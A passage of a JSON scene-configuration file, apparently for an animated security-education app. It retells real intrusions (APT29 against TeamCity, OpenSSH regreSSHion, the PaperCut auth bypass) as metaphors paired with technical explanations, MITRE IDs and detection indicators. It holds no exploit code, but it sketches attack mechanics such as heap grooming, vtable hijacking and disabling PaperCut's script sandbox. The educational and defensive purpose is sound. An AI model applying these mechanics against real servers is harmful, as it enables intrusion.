          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Master Token",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.003"
    },
    "step-3": {
      "scenarioId": "mandiant-apt29-teamcity-jetstream",
      "sectionKey": "step-3",
      "sceneKind": "net-apt29-teamcity-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "Harvesting CI/CD Build Secrets, Deploying GraphicalProton & Pivoting into Active Directory",
      "storyCue": "Now roaming the assembly floor, the intruder copies signing seals and vault combinations from the build lockers, registers a backup supervisor account, and drops a quiet messenger beacon synced to a public storage shelf.",
      "technicalCue": "T1102.002 · LATERAL & C2 — Because a CI/CD build server is the central factory that compiles software and deploys it into production, it stores high-privilege secrets (AWS/Azure deployment keys, GitHub SSH keys, and…",
      "storyMappings": [
        {
          "storyTerm": "Build locker combinations",
          "technicalTerm": "Harvested CI/CD credentials and repository tokens",
          "tone": "amber"
        },
        {
          "storyTerm": "Backup supervisor account",
          "technicalTerm": "Newly created rogue TeamCity administrator",
          "tone": "sky"
        },
        {
          "storyTerm": "Quiet messenger beacon",
          "technicalTerm": "GraphicalProton backdoor implant",
          "tone": "rose"
        },
        {
          "storyTerm": "Public storage shelf",
          "technicalTerm": "Abused OneDrive cloud C2 communication channel",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-apt29-teamcity-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Build locker combinations",
          "subtitle": "Harvested CI/CD credentials and repository tokens",
          "tone": "amber"
        },
        {
          "id": "net-apt29-teamcity-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Backup supervisor account",
          "subtitle": "Newly created rogue TeamCity administrator",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 03 · SETUP",
          "title": "Build locker combinations",
          "storyExcerpt": "Now roaming the assembly floor, the intruder copies signing seals and vault combinations from the build lockers, registers a backup supervisor account, and drops a quiet messenger beacon synced…",
          "technicalParallel": "Compromising a CI/CD server gives the attacker a force-multiplier: they can both steal production cloud credentials stored in build variables and inject malicious code into software packages being built…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Backup supervisor account",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses backup supervisor account to advance toward quiet messenger beacon.",
          "technicalParallel": "Because a CI/CD build server is the central factory that compiles software and deploys it into production, it stores high-privilege secrets (AWS/Azure deployment keys, GitHub SSH keys, and Authenticode…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Impact Beat",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Public storage shelf",
          "storyExcerpt": "Behind the scenes, public storage shelf captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Joint CISA Advisory and Mandiant (long-term persistence and C2 indicators): Creation of new TeamCity admin accounts in teamcity-activities.log and GraphicalProton OneDrive C2 beacons…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Build Deck",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Token Kiosk",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Master Token",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1102.002"
    }
  },
  "openssh-regreSSHion-cve-2024-6387": {
    "briefing": {
      "scenarioId": "openssh-regreSSHion-cve-2024-6387",
      "sectionKey": "briefing",
      "sceneKind": "net-regresshion-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "OpenSSH \"regreSSHion\": SIGALRM Async-Signal-Unsafe syslog() Heap RCE — Story-to-Technical Overview",
      "storyCue": "A night watchman tidies a filing cabinet while a strict wall-clock alarm waits to chime whenever a visitor lingers too long. By flooding the doorway with carefully sized packages right before the bell rings, an outsider catches the watchman mid-shuffle, scrambles the cabinet layout, and redirects the alarm routine into opening the master building vault.",
      "technicalCue": "INITIAL ACCESS: SSH HEAP GROOMING & LOGINGRACETIME EXPIRATION -> DEFENSE EVASION: SIGALRM INTERRUPTS FREE() & CALLS ASYNC-SIGNAL-UNSAFE SYSLOG() -> EXECUTION: GLIBC _IO_FILE VTABLE HIJACK & PRE-AUTH ROOT CODE EXECUTION",
      "storyMappings": [
        {
          "storyTerm": "Night watchman service",
          "technicalTerm": "Privileged OpenSSH sshd authentication daemon",
          "tone": "amber"
        },
        {
          "storyTerm": "Strict wall-clock alarm",
          "technicalTerm": "LoginGraceTime SIGALRM timeout signal handler",
          "tone": "sky"
        },
        {
          "storyTerm": "Filing cabinet shuffle",
          "technicalTerm": "glibc heap memory allocation and free routines",
          "tone": "rose"
        },
        {
          "storyTerm": "Redirected alarm routine",
          "technicalTerm": "Hijacked _IO_FILE vtable yielding root execution",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-regresshion-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Night watchman service",
          "subtitle": "Privileged OpenSSH sshd authentication daemon",
          "tone": "amber"
        },
        {
          "id": "net-regresshion-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Strict wall-clock alarm",
          "subtitle": "LoginGraceTime SIGALRM timeout signal handler",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bell",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "SSH HEAP GROOMING & LOGINGRACETIME EXPIRATION",
          "storyExcerpt": "The outsider sends thousands of timed knock-and-wait packets of alternating sizes to the doorway, arranging empty and occupied slots inside the watchman filing cabinet in a predictable checkerboard right…",
          "technicalParallel": "Why is this vulnerability called \"regreSSHion\"? Because OpenSSH originally fixed this exact signal-handler race in 2006 (CVE-2006-5051) by adding #ifdef DO_LOG_SAFE_IN_SIGHAND to sigdie(), but an…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Half-updated",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "SIGALRM INTERRUPTS FREE() & CALLS ASYNC-SIGNAL-UNSAFE SYSLOG()",
          "storyExcerpt": "At the exact split second the watchman is halfway through updating a cabinet index card, the wall-clock alarm rings and forces an unsafe logging clerk to reach into the same half-updated drawer…",
          "technicalParallel": "Why wasn’t OpenBSD vulnerable to CVE-2024-6387? Because OpenBSD’s syslog_r() implementation is explicitly designed to be async-signal-safe and never calls malloc() or fopen(), whereas Linux’s glibc…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Out Card",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "GLIBC _IO_FILE VTABLE HIJACK & PRE-AUTH ROOT CODE EXECUTION",
          "storyExcerpt": "When the timing aligns, the corrupted drawer pointer swaps out the watchman instruction table for a forged dispatch card. The very next routine action hands the outsider the master building keys without…",
          "technicalParallel": "Although winning the ASLR + timing race takes ~10,000 connections (roughly 3 to 6 hours against default MaxStartups), every failed attempt simply closes a child process while the master sshd daemon…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Watchman Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Heap",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Timer Alarm",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "openssh-regreSSHion-cve-2024-6387",
      "sectionKey": "step-1",
      "sceneKind": "net-regresshion-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Grooming the glibc Heap via SSH Public-Key Packets Before LoginGraceTime (120s) Expires",
      "storyCue": "The outsider sends thousands of timed knock-and-wait packets of alternating sizes to the doorway, arranging empty and occupied slots inside the watchman filing cabinet in a predictable checkerboard right before the timeout bell.",
      "technicalCue": "T1190 · INITIAL ACCESS — To prepare the memory layout inside the privileged pre-authentication sshd child process, the attacker opens concurrent TCP/22 connections and sends a series of SSH2_MSG_USERAUTH_REQUEST…",
      "storyMappings": [
        {
          "storyTerm": "Alternating knock-and-wait packets",
          "technicalTerm": "Crafted SSH public-key authentication messages",
          "tone": "amber"
        },
        {
          "storyTerm": "Filing cabinet checkerboard",
          "technicalTerm": "Groomed glibc heap chunk layout",
          "tone": "sky"
        },
        {
          "storyTerm": "Doorway timeout bell",
          "technicalTerm": "Default 120-second LoginGraceTime threshold",
          "tone": "rose"
        },
        {
          "storyTerm": "Watchman visitor register",
          "technicalTerm": "System /var/log/auth.log authentication log",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-regresshion-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Alternating knock-and-wait packets",
          "subtitle": "Crafted SSH public-key authentication messages",
          "tone": "amber"
        },
        {
          "id": "net-regresshion-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Filing cabinet checkerboard",
          "subtitle": "Groomed glibc heap chunk layout",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Bell",
          "stageTag": "STEP 01 · SETUP",
          "title": "Alternating knock-and-wait packets",
          "storyExcerpt": "The outsider sends thousands of timed knock-and-wait packets of alternating sizes to the doorway, arranging empty and occupied slots inside the watchman filing cabinet in a predictable…",
          "technicalParallel": "Why is this vulnerability called \"regreSSHion\"? Because OpenSSH originally fixed this exact signal-handler race in 2006 (CVE-2006-5051) by adding #ifdef DO_LOG_SAFE_IN_SIGHAND to sigdie(), but an…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Bell",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Filing cabinet checkerboard",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses filing cabinet checkerboard to advance toward doorway timeout bell.",
          "technicalParallel": "To prepare the memory layout inside the privileged pre-authentication sshd child process, the attacker opens concurrent TCP/22 connections and sends a series of SSH2_MSG_USERAUTH_REQUEST packets…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Bell",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Watchman visitor register",
          "storyExcerpt": "Behind the scenes, watchman visitor register captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Qualys TRU and CISA (host log indicators for CVE-2024-6387 race attempts): High-rate bursts of Timeout before authentication for <IP> in /var/log/auth.log across thousands of connections…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Watchman Gate",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Heap",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Timer Alarm",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "openssh-regreSSHion-cve-2024-6387",
      "sectionKey": "step-2",
      "sceneKind": "net-regresshion-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Interrupting free() with SIGALRM & Calling Async-Signal-Unsafe syslog() (CVE-2024-6387)",
      "storyCue": "At the exact split second the watchman is halfway through updating a cabinet index card, the wall-clock alarm rings and forces an unsafe logging clerk to reach into the same half-updated drawer, corrupting adjacent drawer pointers.",
      "technicalCue": "T1068 · DEFENSE EVASION — The attacker times their final packet so that when the kernel delivers SIGALRM (signal 14, triggered when LoginGraceTime reaches 120 seconds), the main sshd thread is halfway through glibc’s…",
      "storyMappings": [
        {
          "storyTerm": "Half-updated index card",
          "technicalTerm": "Interrupted non-reentrant glibc free() operation",
          "tone": "amber"
        },
        {
          "storyTerm": "Wall-clock alarm interruption",
          "technicalTerm": "Asynchronous SIGALRM signal delivery",
          "tone": "sky"
        },
        {
          "storyTerm": "Unsafe logging clerk",
          "technicalTerm": "Async-signal-unsafe syslog() call inside handler",
          "tone": "rose"
        },
        {
          "storyTerm": "Corrupted drawer pointers",
          "technicalTerm": "Overwritten heap metadata and structure pointers",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-regresshion-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Half-updated index card",
          "subtitle": "Interrupted non-reentrant glibc free() operation",
          "tone": "amber"
        },
        {
          "id": "net-regresshion-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Wall-clock alarm interruption",
          "subtitle": "Asynchronous SIGALRM signal delivery",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Half-updated",
          "stageTag": "STEP 02 · SETUP",
          "title": "Half-updated index card",
          "storyExcerpt": "At the exact split second the watchman is halfway through updating a cabinet index card, the wall-clock alarm rings and forces an unsafe logging clerk to reach into the same half-updated…",
          "technicalParallel": "Why wasn’t OpenBSD vulnerable to CVE-2024-6387? Because OpenBSD’s syslog_r() implementation is explicitly designed to be async-signal-safe and never calls malloc() or fopen(), whereas Linux’s glibc…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Wall-clock",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Wall-clock alarm interruption",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses wall-clock alarm interruption to advance toward unsafe logging clerk.",
          "technicalParallel": "The attacker times their final packet so that when the kernel delivers SIGALRM (signal 14, triggered when LoginGraceTime reaches 120 seconds), the main sshd thread is halfway through glibc’s _int_free()…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Card Wall-clock",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Corrupted drawer pointers",
          "storyExcerpt": "Behind the scenes, corrupted drawer pointers captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Qualys TRU (crash forensics produced during race-condition exploitation): sshd child processes crashing with SIGABRT / SIGSEGV in libc.so.6 during unsuccessful race attempts (signaling…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Watchman Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Heap",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Timer Alarm",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1068"
    },
    "step-3": {
      "scenarioId": "openssh-regreSSHion-cve-2024-6387",
      "sectionKey": "step-3",
      "sceneKind": "net-regresshion-step-3",
      "stageBadge": "STEP #3 · EXECUTION",
      "title": "Hijacking glibc _IO_FILE Vtables (_IO_wfile_jumps) for Un-Sandboxed Root RCE",
      "storyCue": "When the timing aligns, the corrupted drawer pointer swaps out the watchman instruction table for a forged dispatch card. The very next routine action hands the outsider the master building keys without any login badge.",
      "technicalCue": "T1059.004 · EXECUTION — Because the 320-byte _IO_FILE structure allocated by fopen(\"/etc/localtime\") sits inside memory controlled by the attacker’s SSH packet, the attacker crafts fake _wide_data and _vtable_offset…",
      "storyMappings": [
        {
          "storyTerm": "Watchman instruction table",
          "technicalTerm": "glibc _IO_FILE _IO_wfile_jumps vtable structure",
          "tone": "amber"
        },
        {
          "storyTerm": "Forged dispatch card",
          "technicalTerm": "Attacker-controlled fake file stream structure",
          "tone": "sky"
        },
        {
          "storyTerm": "Master building keys",
          "technicalTerm": "Un-sandboxed root (uid=0) shell execution",
          "tone": "rose"
        },
        {
          "storyTerm": "Building security camera",
          "technicalTerm": "Linux auditd SYSCALL execve telemetry",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-regresshion-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Watchman instruction table",
          "subtitle": "glibc _IO_FILE _IO_wfile_jumps vtable structure",
          "tone": "amber"
        },
        {
          "id": "net-regresshion-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Forged dispatch card",
          "subtitle": "Attacker-controlled fake file stream structure",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Out Card",
          "stageTag": "STEP 03 · SETUP",
          "title": "Watchman instruction table",
          "storyExcerpt": "When the timing aligns, the corrupted drawer pointer swaps out the watchman instruction table for a forged dispatch card.",
          "technicalParallel": "Although winning the ASLR + timing race takes ~10,000 connections (roughly 3 to 6 hours against default MaxStartups), every failed attempt simply closes a child process while the master sshd daemon…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Card",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Forged dispatch card",
          "storyExcerpt": "The very next routine action hands the outsider the master building keys without any login badge.",
          "technicalParallel": "Because the 320-byte _IO_FILE structure allocated by fopen(\"/etc/localtime\") sits inside memory controlled by the attacker’s SSH packet, the attacker crafts fake _wide_data and _vtable_offset fields…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Keys",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Building security camera",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across building security camera while locking down master building keys.",
          "technicalParallel": "Documented by Qualys TRU and CISA (post-exploitation host telemetry for unauthenticated sshd takeover): Auditd SYSCALL execve from sshd with uid=0 following repeated Timeout before authentication events…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Watchman Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Heap",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Timer Alarm",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    },
    "memory-forensics": {
      "scenarioId": "openssh-regreSSHion-cve-2024-6387",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-regresshion-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "OpenSSH \"regreSSHion\": SIGALRM Async-Signal-Unsafe syslog() Heap RCE — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of watchman gate beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: sshd (SIGALRM Race) (glibc main_arena (4 KB / 320-byte Heap Chunks) [RW-])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of sshd (SIGALRM Race)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x000055C48021A000 (RW-, 132 KB) · glibc main_arena (4 KB / 320-byte Heap Chunks)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against sshd (SIGALRM Race) (PID 14820)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Partially updated glibc smallbin / unsortedbin pointers corrupted when SIGALRM interrupts free() and triggers syslog()…",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-regresshion-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of sshd (SIGALRM…",
          "tone": "sky"
        },
        {
          "id": "net-regresshion-memory-xray-right",
          "tag": "LIVE MEMORY · RW-",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x000055C48021A000 (RW-, 132 KB) · glibc main_arena (4 KB /…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline sshd (SIGALRM Race) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x000055C48021A000 (RW-, 132 KB) containing glibc main_arena (4 KB / 320-byte Heap Chunks).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 14820 confirms injected region: Partially updated glibc smallbin / unsortedbin pointers corrupted when SIGALRM interrupts free() and triggers syslog() -> fopen(\"/etc/localtime\").",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "papercut-ng-cve-2023-27350-bl00dy": {
    "briefing": {
      "scenarioId": "papercut-ng-cve-2023-27350-bl00dy",
      "sectionKey": "briefing",
      "sceneKind": "net-papercut-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "PaperCut MF/NG SetupCompleted Auth Bypass & Rhino JS SYSTEM RCE — Story-to-Technical Overview",
      "storyCue": "A print-shop management office leaves its opening-day welcome card unlocked so anyone stepping up to the counter receives an active manager badge without logging in. Using that badge, an outsider disables the safety shield on automated print-job scripts and inserts a direct office-wide command inside a routine printer rule.",
      "technicalCue": "INITIAL ACCESS: Tapestry SetupCompleted Authentication Bypass (performLogin) -> DEFENSE EVASION: Disabling Print Script Sandbox (print.script.sandboxed=N) -> EXECUTION: Rhino JS Runtime.getRuntime().exec() as SYSTEM (pc-app.exe)",
      "storyMappings": [
        {
          "storyTerm": "Print-shop management office",
          "technicalTerm": "PaperCut MF/NG print management application server",
          "tone": "amber"
        },
        {
          "storyTerm": "Unlocked welcome card",
          "technicalTerm": "SetupCompleted authentication bypass (CVE-2023-27350)",
          "tone": "sky"
        },
        {
          "storyTerm": "Print-job safety shield",
          "technicalTerm": "Mozilla Rhino print.script.sandboxed setting",
          "tone": "rose"
        },
        {
          "storyTerm": "Direct office-wide command",
          "technicalTerm": "Runtime.getRuntime().exec() inside a printer script",
          "tone": "emerald"
        }
      ],
      "accentHex": "#10B981",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-papercut-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Print-shop management office",
          "subtitle": "PaperCut MF/NG print management application server",
          "tone": "amber"
        },
        {
          "id": "net-papercut-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Unlocked welcome card",
          "subtitle": "SetupCompleted authentication bypass (CVE-2023-27350)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Page",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Tapestry SetupCompleted Authentication Bypass (performLogin)",
          "storyExcerpt": "An outsider opens the old installation completion page and clicks straight through the welcome form. Because the door routine fails to verify prior login, the server stamps and hands back an active…",
          "technicalParallel": "Why did SetupCompleted.formSubmit() call performLogin(\"admin\")?",
          "accentHex": "#10B981",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Card",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Disabling Print Script Sandbox (print.script.sandboxed=N)",
          "storyExcerpt": "Inside the manager settings drawer, the outsider enables custom print scripting and flips the protective safety barrier off so printer helper rules can reach outside the print room into the main building…",
          "technicalParallel": "PaperCut embeds the Mozilla Rhino JavaScript engine (org.mozilla.javascript) so administrators can write custom JavaScript policies for print jobs.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Rule",
          "stageTag": "STAGE 03 · EXECUTION",
          "title": "Rhino JS Runtime.getRuntime().exec() as SYSTEM (pc-app.exe)",
          "storyExcerpt": "With the safety barrier disabled, the outsider pastes a short system instruction into an existing printer rule and triggers a test print, instantly executing commands with the print shop highest building…",
          "technicalParallel": "On enterprise hosts, the PaperCut Application Server service (pc-app.exe) runs by default under NT AUTHORITY\\SYSTEM (the highest local operating system privilege level), so any command triggered through…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Print Press",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Setup Desk",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Admin Session",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "papercut-ng-cve-2023-27350-bl00dy",
      "sectionKey": "step-1",
      "sceneKind": "net-papercut-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Minting an Admin JSESSIONID Cookie via /app?service=page/SetupCompleted",
      "storyCue": "An outsider opens the old installation completion page and clicks straight through the welcome form. Because the door routine fails to verify prior login, the server stamps and hands back an active manager badge.",
